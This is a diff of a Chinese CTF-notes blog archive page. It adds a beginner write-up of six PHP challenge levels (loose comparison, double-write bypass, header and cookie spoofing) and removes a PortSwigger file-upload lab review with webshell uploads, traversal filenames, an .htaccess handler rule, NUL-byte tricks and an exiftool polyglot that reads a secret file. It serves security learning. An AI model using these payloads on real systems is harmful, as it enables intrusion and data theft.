@@ -15,7 +15,7 @@
         <link rel="canonical" href="https://guang12-c.github.io/ctf-notes/blog/archive/2026/">
       
       
-        <link rel="prev" href="../../category/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+        <link rel="prev" href="../../category/%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8/">
       
       
         <link rel="next" href="../../../files/">
@@ -25,7 +25,7 @@
       
       
       <link rel="icon" href="../../../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.8.0">
     
     
       
@@ -33,10 +33,10 @@
       
     
     
-      <link rel="stylesheet" href="../../../assets/stylesheets/main.ec1eaa64.min.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.57a0d79d.min.css">
       
         
-        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.fb2fffe2.min.css">
       
       
 
@@ -1739,6 +1739,8 @@
       
         
       
+        
+      
     
     
     
@@ -1984,6 +1986,36 @@
     
   
     文件包含
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../category/%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    新手入门
   
 
     
@@ -2408,6 +2440,172 @@
 <p><strong>和路径遍历那六关是同一个模型：</strong>校验发生在哪一步，绕过就发生在哪一步之前。</p>
 <p><strong>② 还有个没被用上的口子</strong></p>
 <p>第 ③ 轮是 <code>urldecode</code> 之后才截断 —— 这意味着 <code>%3f</code> 编码的问号也能触发截断。这次没用上，但换一道题可能就得靠它。</p>
+    
+    
+  </div>
+</article>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
+          <time datetime="2026-10-24 00:00:00+00:00">2026-10-24</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="../../category/%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8/" class="md-meta__link">新手入门</a>, 
+              <a href="../../category/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="md-meta__link">代码执行</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 3 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="_1"><a class="toclink" href="../../mimi-adventure/">米米的奇幻之旅（六关）</a></h2>
+<p>第一题米米的奇幻之旅，一共六关，都是很基础的东西。</p>
+<p><img alt="第一关" src="../../../assets/images/mimi-adventure/01-level1.png" /></p>
+<h3 id="_2"><a class="toclink" href="../../mimi-adventure/#_2">第一关 · 数字=字符串的魔法</a></h3>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="x">if($_GET['step1']=='2026'){</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="x">    echo '第一关通过！';</span>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="x">}</span>
+</span></code></pre></div>
+<p>首先是一个 PHP 弱比较，直接构造 payload：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>/?step1=2026
+</span></code></pre></div>
+<p><strong>过。</strong></p>
+<h3 id="_3"><a class="toclink" href="../../mimi-adventure/#_3">第二关 · 穿越消失的文字</a></h3>
+<p><img alt="第二关" src="../../../assets/images/mimi-adventure/02-level2.png" /></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="x">$key=$_GET['step2'];</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="x">$key=str_replace('flag', '', $key);</span>
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="x">if($key==='flag'){</span>
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="x">    success;</span>
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="x">}</span>
+</span></code></pre></div>
+<p>这关会把 <code>flag</code> 字符替换为空，注意<strong>替换之后拼起来还是 <code>flag</code></strong>，所以双写绕过：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>/?step1=2026&amp;step2=fflaglag
+</span></code></pre></div>
+<div class="admonition warning">
+<p class="admonition-title">纠正一个常见误解</p>
+<p><code>str_replace('flag','',$key)</code> 默认替换<strong>所有</strong>匹配，不是只替换一次。</p>
+<p>双写之所以有效，是因为 <code>fflaglag</code> 里只有<strong>一个</strong> <code>flag</code> 子串（不重叠）：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>f f l a g l a g
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>  └─flag─┘              ← 只有这一处
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>删掉后 → f + lag = fla g → 又拼回 "flag"
+</span></code></pre></div>
+<p>实测：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>原串: fflaglag
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>删掉 'flag' 后: [flag]
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>含 'flag' 出现次数 = 1
+</span></code></pre></div>
+</div>
+<h3 id="_4"><a class="toclink" href="../../mimi-adventure/#_4">第三关 · 来自本机的访客</a></h3>
+<p><img alt="第三关" src="../../../assets/images/mimi-adventure/03-level3.png" /></p>
+<p>提示伪造地址，在 Burp Suite 抓包后在请求头里加上一行：</p>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="err">X-Forwarded-For: 127.0.0.1</span>
+</span></code></pre></div>
+<p><strong>过。</strong></p>
+<h3 id="_5"><a class="toclink" href="../../mimi-adventure/#_5">第四关 · 管理员身份卡</a></h3>
+<p><img alt="第四关" src="../../../assets/images/mimi-adventure/04-level4.png" /></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="x">if($_COOKIE['admin']=='1'){</span>
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="x">    success;</span>
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="x">}</span>
+</span></code></pre></div>
+<p>Cookie 就是浏览器用来判断用户身份的，所以直接把 cookie 里的全删了，改为：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>admin=1
+</span></code></pre></div>
+<p><strong>过。</strong></p>
+<h3 id="_6"><a class="toclink" href="../../mimi-adventure/#_6">第五关 · 来自东方的语言</a></h3>
+<p><img alt="第五关" src="../../../assets/images/mimi-adventure/05-level5.png" /></p>
+<p>这关说只接待来自喵星的访客，要「语言标记」。</p>
+<p><code>zh-CN</code> 在 <code>Accept-Language</code> 里面已经有了，所以直接把 <code>miao</code> 添加在后面：</p>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="err">Accept-Language: zh-CN,zh;q=0.9,...,miao</span>
+</span></code></pre></div>
+<p><strong>过。</strong></p>
+<h3 id="boss"><a class="toclink" href="../../mimi-adventure/#boss">第六关 · 最终 Boss 喵</a></h3>
+<p><img alt="第六关" src="../../../assets/images/mimi-adventure/06-level6.png" /></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="x">$pwd=$_GET["pwd"];</span>
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="x">if($pwd==0 &amp;&amp; strlen($pwd)&gt;0){</span>
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="x">    flag</span>
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="x">}</span>
+</span></code></pre></div>
+<p>说要既满足等于 0 又要长度大于 0，那不就是 <code>0</code> 吗：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>/?step1=2026&amp;step2=fflaglag&amp;pwd=0
+</span></code></pre></div>
+<p><strong>过了。</strong></p>
+<h3 id="_7"><a class="toclink" href="../../mimi-adventure/#_7">第六关的考点（当时没想明白）</a></h3>
+<p>一开始觉得「这不就是 0 吗」，后来明白出题人想考的其实是 <strong><code>==</code> 松散比较的坑</strong>：</p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="x">var_dump("abc" == 0);    // PHP 7 下 → bool(true)</span>
+</span></code></pre></div>
+<p><strong>在 PHP 7 里，任意「非数字字符串」和 0 做 <code>==</code> 比较，结果都是 <code>true</code>。</strong></p>
+<p>所以第六关的正确解法其实非常多：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>?pwd=0        ← 我用的,长度 1,数值也是 0
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>?pwd=abc      ← 更"标准"的答案,长度 3,但 == 0 为真
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>?pwd=admin    ← 一样能过
+</span></code></pre></div>
+<p><code>pwd=0</code> 只是碰巧也对，<strong>真正的知识点是 <code>"任意字符" == 0 为 true</code></strong>。</p>
+<p>（PHP 8 之后这个坑被修了，<code>"abc" == 0</code> 变成 <code>false</code>。）</p>
+<h3 id="payload"><a class="toclink" href="../../mimi-adventure/#payload">最终 payload</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>/?step1=2026&amp;step2=fflaglag&amp;pwd=0
+</span></code></pre></div>
+<p><img alt="拿到 flag" src="../../../assets/images/mimi-adventure/07-flag.png" /></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>flag{4a950787-6159-4af4-adea-c8a40ffd8e34}
+</span></code></pre></div>
+<h3 id="_8"><a class="toclink" href="../../mimi-adventure/#_8">六关小结</a></h3>
+<table>
+<thead>
+<tr>
+<th>关</th>
+<th>考点</th>
+<th>一句话</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><code>==</code> 弱比较</td>
+<td>数字和字符串可以相等</td>
+</tr>
+<tr>
+<td>2</td>
+<td>双写绕过</td>
+<td>删掉中间的，前后又拼回来</td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>X-Forwarded-For</code></td>
+<td>服务器信的 IP 可以伪造</td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>Cookie</code></td>
+<td>身份放客户端 = 没有校验</td>
+</tr>
+<tr>
+<td>5</td>
+<td><code>Accept-Language</code></td>
+<td>语言标记也是可伪造的输入</td>
+</tr>
+<tr>
+<td>6</td>
+<td><code>== 0</code></td>
+<td>任意非数字字符串都等于 0（PHP 7）</td>
+</tr>
+</tbody>
+</table>
+<p><strong>第 3、4、5 关其实是同一个病根：</strong>服务端信任了客户端可控的输入（IP 头、Cookie、语言标记）。</p>
+<p><strong>第 1 和第 6 关是同一个病根：</strong><code>==</code> 松散比较。</p>
     
     
   </div>
@@ -3109,139 +3307,6 @@
   </div>
 </article>
       
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2026-10-20 00:00:00+00:00">2026-10-20</time></li>
-        
-          <li class="md-meta__item">
-            分类于
-            
-              <a href="../../category/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="md-meta__link">文件上传</a>, 
-              <a href="../../category/portswigger/" class="md-meta__link">PortSwigger</a></li>
-        
-        
-          
-          <li class="md-meta__item">
-            
-              需要 2 分钟阅读时间
-            
-          </li>
-        
-        
-      </ul>
-      
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="portswigger-5"><a class="toclink" href="../../portswigger-file-upload/">PortSwigger 文件上传 5 关复盘</a></h2>
-<p>从"能上传"到"能执行"，中间隔了三道门。</p>
-<h3 id="_1"><a class="toclink" href="../../portswigger-file-upload/#_1">三道防线</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>① 文件名格式校验   字符白名单 ^[a-zA-Z0-9._-]+$
-</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>② 扩展名黑/白名单   .php 被拒
-</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>③ Web 服务器 handler 没有该后缀 → 当静态文件返回
-</span></code></pre></div>
-<p><strong>四种报错形态直接对应四层：</strong></p>
-<table>
-<thead>
-<tr>
-<th>你看到的</th>
-<th>卡在哪</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>400 + JSON</td>
-<td>应用层格式校验</td>
-</tr>
-<tr>
-<td>正常页 + "不允许"</td>
-<td>应用层扩展名校验</td>
-</tr>
-<tr>
-<td>403</td>
-<td>权限</td>
-</tr>
-<tr>
-<td><strong>200 + 源码</strong></td>
-<td><strong>服务器 handler 缺失</strong></td>
-</tr>
-<tr>
-<td>200 + 输出</td>
-<td>成功</td>
-</tr>
-</tbody>
-</table>
-<h3 id="1"><a class="toclink" href="../../portswigger-file-upload/#1">第 1 关：直接上传</a></h3>
-<p>传 <code>.php</code>（内容是 shell），访问 <code>/files/avatars/shell.php</code>。</p>
-<p><strong>卡点：路径找错。</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>❌ /my-account/avatar/shell.php     ← 这是上传接口
-</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>✅ /files/avatars/shell.php         ← 这是文件目录
-</span></code></pre></div>
-<p><strong>找路径的办法：打开"显示这个文件"的页面，看 <code>&lt;img src&gt;</code>。</strong></p>
-<h3 id="2"><a class="toclink" href="../../portswigger-file-upload/#2">第 2 关：路径穿越</a></h3>
-<div class="language-http highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="err">filename="../shell.php"</span>
-</span></code></pre></div>
-<p><strong>判断穿越成功没有，看响应字符串：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>The file avatars/shell.php has been uploaded      → ../ 被吃掉
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>The file avatars/../shell.php has been uploaded   → 穿越成功 ✅
-</span></code></pre></div>
-<p><strong>访问时不要带 <code>..</code>：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>❌ /files/avatars/../shell.php
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>✅ /files/shell.php
-</span></code></pre></div>
-<h3 id="3"><a class="toclink" href="../../portswigger-file-upload/#3">第 3 关：扩展名黑名单</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>aa.php      → 被拒
-</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>aa.pHp5     → 上传成功,但访问返回源码(没有 .php5 的 handler)
-</span></code></pre></div>
-<p><strong>解法：上传 <code>.htaccess</code> 改规则</strong></p>
-<div class="language-apache highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="nb">AddType</span><span class="w"> </span>application/x-httpd-php<span class="w"> </span>.lhm
-</span></code></pre></div>
-<p>然后传 <code>shell.lhm</code> → 执行。</p>
-<div class="admonition warning">
-<p class="admonition-title">三个拼写陷阱</p>
-<p><code>x-httped-php</code> → 应为 <strong><code>x-httpd-php</code></strong>
-<code>.1hm</code> → 应为 <strong><code>.lhm</code></strong>（字母 L，不是数字 1）
-<code>AddType php .lhm</code> → MIME 必须写全</p>
-</div>
-<h3 id="4"><a class="toclink" href="../../portswigger-file-upload/#4">第 4 关：混淆扩展名</a></h3>
-<p>白名单只允许 jpg/png。</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>shell.php        → 拒绝
-</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>shell.php.jpg    → 通过,但静态(两边都取最后后缀)
-</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>shell.php%00.jpg → 执行 ✅（NUL 截断）
-</span></code></pre></div>
-<p><strong>原理：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>校验看到:  shell.php\0.jpg  → 以 .jpg 结尾 → 放行
-</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>存储使用:  shell.php         → 读到 \0 就停
-</span></code></pre></div>
-<p><strong>我试了 <code>%20</code> 也能过 —— 说明那个实现按空白截断。但这是巧合，不是通用手法。</strong></p>
-<h3 id="5-polyglot"><a class="toclink" href="../../portswigger-file-upload/#5-polyglot">第 5 关：多语言文件（polyglot）</a></h3>
-<p>题目只接受"合法图片"，改任何后缀都被拒。</p>
-<p><strong>判断：校验的是内容，不是后缀。</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>改后缀有效   → 查后缀
-</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>改后缀无效   → 查内容
-</span></code></pre></div>
-<p><strong>解法：把 PHP 写进真实图片的元数据</strong></p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>exiftool<span class="w"> </span>-Comment<span class="o">=</span><span class="s2">"&lt;?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?&gt;"</span><span class="w"> </span><span class="se">\</span>
-</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="w">         </span>photo.jpg<span class="w"> </span>-o<span class="w"> </span>shell.php
-</span></code></pre></div>
-<p><strong>为什么需要 START/END 标记：</strong></p>
-<p>PHP 会把 <code>&lt;?php ?&gt;</code> 之外的内容原样输出 —— 响应里混着整张图片的二进制，
-标记让 secret 在垃圾数据里可搜索。</p>
-<h3 id="_2"><a class="toclink" href="../../portswigger-file-upload/#_2">收获</a></h3>
-<blockquote>
-<p><strong>上传题永远先问三个问题：存到哪了、存成什么、那个目录执行不执行 PHP。</strong></p>
-<p><strong>"能上传"和"能执行"是两件事 —— 绕过校验 ≠ 拿到 shell。</strong></p>
-<p><strong>遇到"改后缀一直说不是合法图片"，说明它在查内容，别再折腾后缀了。</strong></p>
-</blockquote>
-    
-    
-  </div>
-</article>
-      
       
         
           
@@ -3249,7 +3314,7 @@
 
 
 <nav class="md-pagination">
-  
+  <span class="md-pagination__current">1</span> <a class="md-pagination__link" href="page/2/">2</a>
 </nav>
         
       
@@ -3301,10 +3366,10 @@
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.tabs", "navigation.sections", "navigation.indexes", "navigation.top", "navigation.tracking", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate", "content.tabs.link", "toc.follow"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.tabs", "navigation.sections", "navigation.indexes", "navigation.top", "navigation.tracking", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate", "content.tabs.link", "toc.follow"], "search": "../../../assets/javascripts/workers/search.a7633da7.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
     
     
-      <script src="../../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.c21346df.min.js"></script>
       
         <script src="../../../assets/js/bg-video.js"></script>
       
